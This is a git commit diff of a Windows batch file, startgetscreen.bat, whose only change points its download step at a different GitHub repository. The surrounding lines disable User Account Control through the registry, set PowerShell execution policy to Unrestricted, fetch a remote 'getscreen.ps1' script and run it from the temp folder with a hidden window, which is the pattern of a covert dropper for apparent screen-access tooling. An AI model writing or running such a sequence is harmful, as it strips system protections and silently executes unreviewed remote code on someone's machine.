8675cfd20ce34245253696785203c3cee10675e7
dardaya5544 <88020995+dardaya5544@users.noreply.github.com>
2024-01-24 22:50:23 +0500

    Update startgetscreen.bat

--- startgetscreen.bat
+++ startgetscreen.bat
@@ -7,7 +7,7 @@ echo Skip UAC...
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 echo Download and save the Script to the temp folder
 powershell -Command "Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser"
-powershell -Command "curl https://raw.githubusercontent.com/d3d0n/funwngrok/main/getscreen.ps1"
+powershell -Command "curl https://raw.githubusercontent.com/dardaya5544/getscreen/main/getscreen.ps1"
 echo Run the Script Without Powershell Window
 powershell -Command "& $env:temp\getscreen.ps1 -WindowStyle Hidden"
 echo Done!
